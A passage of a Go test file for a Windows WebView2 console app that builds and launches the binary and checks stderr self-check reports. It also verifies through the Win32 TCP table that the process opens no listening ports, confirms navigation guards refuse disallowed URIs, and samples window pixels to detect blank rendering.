		// GetExtendedTcpTable, iphlpapi.dll - no netstat shell-out) and
		// filtered to this process's PID. This is broader than the hostile-
		// port check above: it would also catch a listener on any other
		// port, from any other cause.
		matches, qerr := processOwnsAnyListener(pid)
		if qerr != nil {
			t.Fatalf("ADR 0018 'no port opens' guard: could not query the owner-PID TCP table: %v", qerr)
		}
		for _, m := range matches {
			t.Errorf("ADR 0018 'no port opens' guard: pid %d (cia-console.exe) owns a "+
				"listening TCP socket on port %d", pid, m.LocalPort)
		}
	})
}

// buildConsoleBinary builds the cmd/cia-console package (pkgDir) into a
// fresh temp directory and returns the built exe's path.
func buildConsoleBinary(t *testing.T, pkgDir string) string {
	t.Helper()

	// PATH first, then $GOROOT - deliberately not `runtime.GOROOT()`, which is
	// deprecated as of Go 1.24 and which staticcheck flags (SA1019). The
	// deprecation's reasoning applies exactly here: `runtime.GOROOT()` returns
	// the path baked in when *this test binary* was built, which says nothing
	// about where a toolchain lives on the machine now running it. The
	// environment variable is the live answer, and it is what `go test` sets
	// for the binary it spawns - so the fallback keeps working for someone who
	// invoked an absolute `go.exe` that is not on PATH, which is the only case
	// it was ever there for.
	goBin, err := exec.LookPath("go")
	if err != nil {
		goroot := os.Getenv("GOROOT")
		if goroot == "" {
			t.Fatalf("locate a go toolchain: PATH lookup failed (%v) and GOROOT is unset", err)
		}
		candidate := filepath.Join(goroot, "bin", "go.exe")
		if _, statErr := os.Stat(candidate); statErr != nil {
			t.Fatalf("locate a go toolchain: PATH lookup failed (%v) and GOROOT candidate %s "+
				"does not exist either (%v)", err, candidate, statErr)
		}
		goBin = candidate
	}

	outPath := filepath.Join(t.TempDir(), "cia-console.exe")
	build := exec.Command(goBin, "build", "-o", outPath, ".")
	build.Dir = pkgDir
	build.Env = os.Environ()
	out, err := build.CombinedOutput()
	if err != nil {
		t.Fatalf("go build ./cmd/cia-console: %v\n%s", err, out)
	}
	return outPath
}

// freeTCPPort finds a currently-unused loopback TCP port by binding to
// port 0 and immediately releasing it, so it can be handed to the child
// process as the hostile --remote-debugging-port target.
func freeTCPPort(t *testing.T) int {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("find a free TCP port: %v", err)
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port
}

// withEnvOverride returns a copy of base with every existing key=value entry
// for key removed and key=value appended once. Used instead of a bare
// append so the child never sees two conflicting entries for the same
// variable.
func withEnvOverride(base []string, key, value string) []string {
	prefix := key + "="
	out := make([]string, 0, len(base)+1)
	for _, kv := range base {
		if strings.HasPrefix(kv, prefix) {
			continue
		}
		out = append(out, kv)
	}
	return append(out, prefix+value)
}

// dialSucceeds reports whether a TCP connection to 127.0.0.1:port succeeds.
// A short timeout is enough: a real listener on loopback accepts near-
// instantly, and the absence of one fails fast with connection refused.
func dialSucceeds(port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 750*time.Millisecond)
	if err != nil {
		return false
	}
	_ = conn.Close()
	return true
}

// syncBuffer is an io.Writer safe for concurrent use: os/exec copies the
// child's stderr into it from its own goroutine while the test polls its
// contents from the main goroutine.
type syncBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.buf.Write(p)
}

func (s *syncBuffer) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.buf.String()
}

// waitForSelfCheck polls buf for main_windows.go's "load self-check: "
// marker (see NavigationCompletedCallback's log.Printf in main_windows.go)
// and returns everything after it on that line. It polls on a short,
// bounded interval rather than sleeping for the whole timeout up front, and
// gives up early - with the stderr captured so far - if the process exits
// (done closed) before the marker ever appears.
func waitForSelfCheck(buf *syncBuffer, done <-chan struct{}, timeout time.Duration) (string, error) {
	const marker = "load self-check: "
	deadline := time.Now().Add(timeout)
	for {
		content := buf.String()
		if idx := strings.Index(content, marker); idx >= 0 {
			rest := content[idx+len(marker):]
			rest = strings.SplitN(rest, "\n", 2)[0]
			return strings.TrimRight(rest, "\r"), nil
		}
		select {
		case <-done:
			return "", fmt.Errorf("cia-console.exe exited before the self-check line appeared; stderr:\n%s", content)
		default:
		}
		if time.Now().After(deadline) {
			return "", fmt.Errorf("load self-check line did not arrive within %s; stderr so far:\n%s", timeout, content)
		}
		time.Sleep(150 * time.Millisecond)
	}
}

// parseWxH parses a "WxH" string (as main_windows.go's self-check emits for
// viewport and bodyRect) into two ints.
func parseWxH(s string) (w, h int, err error) {
	parts := strings.SplitN(s, "x", 2)
	if len(parts) != 2 {
		return 0, 0, fmt.Errorf("value %q is not in WxH form", s)
	}
	w, err = strconv.Atoi(parts[0])
	if err != nil {
		return 0, 0, fmt.Errorf("parse width from %q: %w", s, err)
	}
	h, err = strconv.Atoi(parts[1])
	if err != nil {
		return 0, 0, fmt.Errorf("parse height from %q: %w", s, err)
	}
	return w, h, nil
}

// windowText reads a window's title via GetWindowTextW. Note this reuses
// main_windows.go's own `user32` *windows.LazyDLL (declared in that file's
// Win32 window hosting section) rather than opening a second handle to
// user32.dll - it is a plain read of a package-level variable, not an edit
// to that file.
func windowText(hwnd windows.HWND) string {
	getWindowTextW := user32.NewProc("GetWindowTextW")
	buf := make([]uint16, 512)
	ret, _, _ := getWindowTextW.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if ret == 0 {
		return ""
	}
	return windows.UTF16ToString(buf[:ret])
}

// findMainWindow enumerates every top-level window on the desktop and
// returns the one owned by pid whose title is exactly title, or 0 if none
// matches. The EnumWindows callback always returns TRUE (continue): per the
// Win32 docs, returning FALSE to stop enumeration early makes EnumWindows's
// own return value (and therefore GetLastError-derived err) meaningless, so
// stopping early would make failures indistinguishable from success here.
// Collecting every match into a closure variable and inspecting it after
// EnumWindows returns avoids that pitfall entirely.
func findMainWindow(pid uint32, title string) windows.HWND {
	var found windows.HWND
	cb := syscall.NewCallback(func(hwnd windows.HWND, _ uintptr) uintptr {
		var owner uint32
		if _, err := windows.GetWindowThreadProcessId(hwnd, &owner); err != nil {
			return 1
		}
		if owner != pid {
			return 1
		}
		if windowText(hwnd) == title {
			found = hwnd
		}
		return 1
	})
	_ = windows.EnumWindows(cb, nil)
	return found
}

// listChildWindows returns every descendant window of parent.
// EnumChildWindows recurses into grandchildren on its own, so this picks up
// the WebView2 controller's full composited tree (Chrome_WidgetWin_0/_1 and
// the intermediate D3D window), not just its immediate children.
func listChildWindows(parent windows.HWND) []windows.HWND {
	var children []windows.HWND
	cb := syscall.NewCallback(func(hwnd windows.HWND, _ uintptr) uintptr {
		children = append(children, hwnd)
		return 1
	})
	windows.EnumChildWindows(parent, cb, nil)
	return children
}

// --- ADR 0018 "no port opens": owner-PID TCP table -------------------------
//
// golang.org/x/sys/windows has no GetExtendedTcpTable wrapper, so this
// declares the syscall itself via windows.NewLazySystemDLL/NewProc - the
// same mechanism main_windows.go already uses for the handful of Win32
// calls x/sys/windows does not cover (MessageBoxW, ShowWindow, ...). No new
// module dependency is added; this still only uses golang.org/x/sys, which
// go.mod already requires. Doing it this way (instead of shelling out to
// netstat) means the check is against the same owner-PID table Windows
// itself uses to answer "what does this process have open", not a parsed
// text report from a separate tool.

// tcpTableOwnerPIDListener is TCP_TABLE_OWNER_PID_LISTENER from iphlpapi.h:
// GetExtendedTcpTable pre-filters to listening sockets only, each row
// already carrying its owning PID.
const tcpTableOwnerPIDListener = 3

var (
	modIphlpapi             = windows.NewLazySystemDLL("iphlpapi.dll")
	procGetExtendedTCPTable = modIphlpapi.NewProc("GetExtendedTcpTable")
)

// listeningSocket is one row of the owner-PID listening table this test
// cares about.
type listeningSocket struct {
	LocalPort uint32
	OwningPID uint32
}

// listeningTCPSockets calls GetExtendedTcpTable(family, TCP_TABLE_OWNER_PID_
// LISTENER) and parses every MIB_TCPROW_OWNER_PID (family=AF_INET, 24-byte
// rows) or MIB_TCP6ROW_OWNER_PID (family=AF_INET6, 56-byte rows) in the
// returned table. The table's own layout - a leading dwNumEntries uint32
// followed by that many fixed-size rows - is parsed with encoding/binary
// rather than a cast through unsafe.Pointer, so it does not depend on Go's
// struct layout matching the C ABI byte-for-byte.
func listeningTCPSockets(family uint32) ([]listeningSocket, error) {
	var size uint32
	ret, _, _ := procGetExtendedTCPTable.Call(0, uintptr(unsafe.Pointer(&size)), 0, uintptr(family), tcpTableOwnerPIDListener, 0)
	if ret != 0 && windows.Errno(ret) != windows.ERROR_INSUFFICIENT_BUFFER {
		return nil, fmt.Errorf("GetExtendedTcpTable(size probe, family=%d): win32 error %d", family, ret)
	}
	if size == 0 {
		return nil, nil
	}
	buf := make([]byte, size)
	ret, _, _ = procGetExtendedTCPTable.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)), 0, uintptr(family), tcpTableOwnerPIDListener, 0)
	if ret != 0 {
		return nil, fmt.Errorf("GetExtendedTcpTable(family=%d): win32 error %d", family, ret)
	}
	if len(buf) < 4 {
		return nil, nil
	}

	var rowSize int
	switch family {
	case windows.AF_INET:
		rowSize = 24 // MIB_TCPROW_OWNER_PID: 6 x DWORD
	case windows.AF_INET6:
		rowSize = 56 // MIB_TCP6ROW_OWNER_PID: 16 + 4 + 4 + 16 + 4 + 4 + 4 + 4 bytes
	default:
		return nil, fmt.Errorf("unsupported address family %d", family)
	}

	count := binary.LittleEndian.Uint32(buf[0:4])
	out := make([]listeningSocket, 0, count)
	offset := 4
	for i := uint32(0); i < count; i++ {
		if offset+rowSize > len(buf) {
			break
		}
		row := buf[offset : offset+rowSize]
		var portRaw, pid uint32
		switch family {
		case windows.AF_INET:
			portRaw = binary.LittleEndian.Uint32(row[8:12])
			pid = binary.LittleEndian.Uint32(row[20:24])
		case windows.AF_INET6:
			portRaw = binary.LittleEndian.Uint32(row[20:24])
			pid = binary.LittleEndian.Uint32(row[52:56])
		}
		out = append(out, listeningSocket{LocalPort: ntohsPort(portRaw), OwningPID: pid})
		offset += rowSize
	}
	return out, nil
}

// ntohsPort extracts the 16-bit network-byte-order port number MIB_TCPROW_
// OWNER_PID/MIB_TCP6ROW_OWNER_PID store in the low half of a DWORD field and
// converts it to a host-byte-order value.
func ntohsPort(raw uint32) uint32 {
	lo := raw & 0xFFFF
	return ((lo & 0xFF) << 8) | ((lo >> 8) & 0xFF)
}

// processOwnsAnyListener reports every TCP listening socket (IPv4 and IPv6)
// owned by pid.
func processOwnsAnyListener(pid uint32) ([]listeningSocket, error) {
	var matches []listeningSocket
	for _, family := range []uint32{windows.AF_INET, windows.AF_INET6} {
		rows, err := listeningTCPSockets(family)
		if err != nil {
			return nil, err
		}
		for _, row := range rows {
			if row.OwningPID == pid {
				matches = append(matches, row)
			}
		}
	}
	return matches, nil
}

// assertKeys reports every required key missing from what actually reached the
// page, rather than failing on the first one. A projection that drops fields
// drops many at once, and the whole list is what identifies which struct is
// too narrow - stopping at the first missing key would turn one diagnosis into
// a dozen sequential runs.
// renderSelfCheck is main_windows.go's delayed "render self-check:" report -
// the document sampled after the status query resolved and React re-rendered,
// rather than at the instant the bridge reply landed.
type renderSelfCheck struct {
	TextLength   int `json:"textLength"`
	BusyRegions  int `json:"busyRegions"`
	AlertRegions int `json:"alertRegions"`
}

// visualSelfCheck is main_windows.go's Sprint 9 geometry report. It is emitted
// by the page after render settles, before the hostile navigation probes begin.
// It contains only counts and dimensions; pixel evidence is captured outside the
// page from the live Win32 window below.
type visualSelfCheck struct {
	ViewportWidth       int `json:"viewportWidth"`
	ViewportHeight      int `json:"viewportHeight"`
	DocumentScrollWidth int `json:"documentScrollWidth"`
	BodyScrollWidth     int `json:"bodyScrollWidth"`
	HorizontalOverflow  int `json:"horizontalOverflowPx"`
	InvisibleCritical   int `json:"invisibleCritical"`
	PrimaryNavButtons   int `json:"primaryNavButtons"`
	MainHeadings        int `json:"mainHeadings"`
	OverviewSections    int `json:"overviewSections"`
	VisibleButtons      int `json:"visibleButtons"`
	InteractiveTooSmall int `json:"interactiveTooSmall"`
}

type windowPixelSummary struct {
	Width           int
	Height          int
	TotalPixels     int
	QuantizedColors int
	DominantRatio   float64
	DarkPixels      int
	LightPixels     int
	MidPixels       int
}

// waitForRenderCheck polls buf for the delayed render report. It is a separate
// marker from the load self-check on purpose: the two describe the document at
// two different moments, and conflating them is what let a console that
// rendered nothing but an error card report a clean load for an entire sprint.
func waitForRenderCheck(buf *syncBuffer, done <-chan struct{}, timeout time.Duration) (string, error) {
	const marker = "render self-check: "
	deadline := time.Now().Add(timeout)
	for {
		content := buf.String()
		if idx := strings.Index(content, marker); idx >= 0 {
			rest := content[idx+len(marker):]
			rest = strings.SplitN(rest, "\n", 2)[0]
			return strings.TrimRight(rest, "\r"), nil
		}
		select {
		case <-done:
			return "", fmt.Errorf("cia-console.exe exited before the render self-check appeared; stderr:\n%s", content)
		default:
		}
		if time.Now().After(deadline) {
			return "", fmt.Errorf("render self-check did not arrive within %s; stderr so far:\n%s", timeout, content)
		}
		time.Sleep(150 * time.Millisecond)
	}
}

func waitForVisualCheck(buf *syncBuffer, done <-chan struct{}, timeout time.Duration) (string, error) {
	const marker = "visual self-check: "
	deadline := time.Now().Add(timeout)
	for {
		content := buf.String()
		if idx := strings.Index(content, marker); idx >= 0 {
			rest := content[idx+len(marker):]
			rest = strings.SplitN(rest, "\n", 2)[0]
			return strings.TrimRight(rest, "\r"), nil
		}
		select {
		case <-done:
			return "", fmt.Errorf("cia-console.exe exited before the visual self-check appeared; stderr:\n%s", content)
		default:
		}
		if time.Now().After(deadline) {
			return "", fmt.Errorf("visual self-check did not arrive within %s; stderr so far:\n%s", timeout, content)
		}
		time.Sleep(150 * time.Millisecond)
	}
}

// navGuardSelfCheck is main_windows.go's "navigation guard self-check:"
// report, emitted when the page posts the nav-probe marker after trying to
// navigate somewhere it is not allowed to go.
type navGuardSelfCheck struct {
	Installed      bool   `json:"installed"`
	Refusals       int    `json:"refusals"`
	LastRefusedURI string `json:"lastRefusedURI"`
	PageSurvived   bool   `json:"pageSurvived"`

	// The second egress channel. Counted separately from the navigation
	// refusals because a run that refused a navigation and silently allowed a
	// window.open would otherwise look identical to one that closed both.
	WindowGuardInstalled bool   `json:"windowGuardInstalled"`
	WindowRefusals       int    `json:"windowRefusals"`
	LastRefusedWindowURI string `json:"lastRefusedWindowURI"`
}

func waitForNavGuardCheck(buf *syncBuffer, done <-chan struct{}, timeout time.Duration) (string, error) {
	const marker = "navigation guard self-check: "
	deadline := time.Now().Add(timeout)
	for {
		content := buf.String()
		if idx := strings.Index(content, marker); idx >= 0 {
			rest := content[idx+len(marker):]
			rest = strings.SplitN(rest, "\n", 2)[0]
			return strings.TrimRight(rest, "\r"), nil
		}
		select {
		case <-done:
			return "", fmt.Errorf("cia-console.exe exited before the navigation guard self-check appeared; stderr:\n%s", content)
		default:
		}
		if time.Now().After(deadline) {
			return "", fmt.Errorf("navigation guard self-check did not arrive within %s; stderr so far:\n%s", timeout, content)
		}
		time.Sleep(150 * time.Millisecond)
	}
}

// --- Sprint 9 visual snapshot ------------------------------------------------
//
// The DOM-side visual self-check above can prove that the layout tree has sane
// geometry, but the WebView2 blank-window failure class lives outside the page:
// the DOM can be fully loaded while the controller composites nothing. These
// helpers sample the actual Win32 pixels for the largest visible child window,
// then assert only broad image properties. There is no golden screenshot, no
// OCR, and no fixture churn.

const (
	srccopy       = 0x00CC0020
	biRGB         = 0
	dibRGBColors  = 0
	minPixelWidth = 1
)

var (
	gdi32 = windows.NewLazySystemDLL("gdi32.dll")

	procGetWindowRect          = user32.NewProc("GetWindowRect")
	procGetWindowDC            = user32.NewProc("GetWindowDC")
	procReleaseDC              = user32.NewProc("ReleaseDC")
	procSetForegroundWindow    = user32.NewProc("SetForegroundWindow")
	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
)

type bitmapInfoHeader struct {
	Size          uint32
	Width         int32
	Height        int32
	Planes        uint16
	BitCount      uint16
	Compression   uint32
	SizeImage     uint32
	XPelsPerMeter int32
	YPelsPerMeter int32
	ClrUsed       uint32
	ClrImportant  uint32
}

type bitmapInfo struct {
	Header bitmapInfoHeader
	Colors [1]uint32
}

func largestVisibleChild(parent windows.HWND) windows.HWND {
	var best windows.HWND
	var bestArea int64
	for _, child := range listChildWindows(parent) {
		if !windows.IsWindowVisible(child) {
			continue
		}
		rect, err := windowRect(child)
		if err != nil {
			continue
		}
		width := int64(rect.Right - rect.Left)
		height := int64(rect.Bottom - rect.Top)
		if width < minPixelWidth || height < minPixelWidth {
			continue
		}
		area := width * height
		if area > bestArea {
			best = child
			bestArea = area
		}
	}
	return best
}

func windowRect(hwnd windows.HWND) (windows.Rect, error) {
	var rect windows.Rect
	ret, _, callErr := procGetWindowRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&rect)))
	if ret == 0 {
		return windows.Rect{}, fmt.Errorf("GetWindowRect(%#x): %w", uintptr(hwnd), callErr)
	}
	return rect, nil
}

func captureWindowPixels(hwnd windows.HWND) (windowPixelSummary, error) {
	rect, err := windowRect(hwnd)
	if err != nil {
		return windowPixelSummary{}, err
	}
	width := int(rect.Right - rect.Left)
	height := int(rect.Bottom - rect.Top)
	if width < minPixelWidth || height < minPixelWidth {
		return windowPixelSummary{}, fmt.Errorf("window %#x has invalid capture size %dx%d", uintptr(hwnd), width, height)
	}

	windowDC, _, callErr := procGetWindowDC.Call(uintptr(hwnd))
	if windowDC == 0 {
		return windowPixelSummary{}, fmt.Errorf("GetWindowDC(%#x): %w", uintptr(hwnd), callErr)
	}
	defer procReleaseDC.Call(uintptr(hwnd), windowDC)

	memDC, _, callErr := procCreateCompatibleDC.Call(windowDC)
	if memDC == 0 {
		return windowPixelSummary{}, fmt.Errorf("CreateCompatibleDC: %w", callErr)
	}
	defer procDeleteDC.Call(memDC)

	bitmap, _, callErr := procCreateCompatibleBitmap.Call(windowDC, uintptr(width), uintptr(height))
	if bitmap == 0 {
		return windowPixelSummary{}, fmt.Errorf("CreateCompatibleBitmap(%dx%d): %w", width, height, callErr)
	}
	defer procDeleteObject.Call(bitmap)

	oldObject, _, _ := procSelectObject.Call(memDC, bitmap)
	if oldObject != 0 {
		defer procSelectObject.Call(memDC, oldObject)
	}

	copied, _, callErr := procBitBlt.Call(
		memDC,
		0,
		0,
		uintptr(width),
		uintptr(height),
		windowDC,
		0,
		0,
		srccopy,
	)
	if copied == 0 {
		return windowPixelSummary{}, fmt.Errorf("BitBlt(%#x, %dx%d): %w", uintptr(hwnd), width, height, callErr)
	}

	bmi := bitmapInfo{}
	bmi.Header.Size = uint32(unsafe.Sizeof(bmi.Header))
	bmi.Header.Width = int32(width)
	bmi.Header.Height = -int32(height) // top-down DIB; first bytes are the top-left pixel.
	bmi.Header.Planes = 1
	bmi.Header.BitCount = 32
	bmi.Header.Compression = biRGB

	pixels := make([]byte, width*height*4)
	lines, _, callErr := procGetDIBits.Call(
		memDC,
		bitmap,
		0,
		uintptr(height),
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bmi)),
		dibRGBColors,
	)
	if lines == 0 {
		return windowPixelSummary{}, fmt.Errorf("GetDIBits(%#x, %dx%d): %w", uintptr(hwnd), width, height, callErr)
	}

	return summarizeBGRA(pixels, width, height), nil
}

func summarizeBGRA(pixels []byte, width, height int) windowPixelSummary {
	total := width * height
	buckets := make(map[uint32]int, 64)
	summary := windowPixelSummary{
		Width:       width,
		Height:      height,
		TotalPixels: total,
	}
	var dominant int
	for i := 0; i+3 < len(pixels); i += 4 {
		b := int(pixels[i])
		g := int(pixels[i+1])
		r := int(pixels[i+2])
		luminance := (299*r + 587*g + 114*b) / 1000
		switch {
		case luminance < 64:
			summary.DarkPixels++
		case luminance > 180:
			summary.LightPixels++
		default:
			summary.MidPixels++
		}
		key := uint32(r>>4)<<8 | uint32(g>>4)<<4 | uint32(b>>4)
		buckets[key]++
		if buckets[key] > dominant {
			dominant = buckets[key]
		}
	}
	summary.QuantizedColors = len(buckets)
	if total > 0 {
		summary.DominantRatio = float64(dominant) / float64(total)
	}
	return summary
}

func assertKeys(t *testing.T, what string, got []string, required []string) {
	t.Helper()
	present := make(map[string]bool, len(got))
	for _, k := range got {
		present[k] = true
	}
	var missing []string
	for _, k := range required {
		if !present[k] {
			missing = append(missing, k)
		}
	}
	if len(missing) > 0 {
		t.Errorf("%s reached the page missing %d key(s) the console's schema requires: %v; arrived with: %v",
			what, len(missing), missing, got)
	}
}
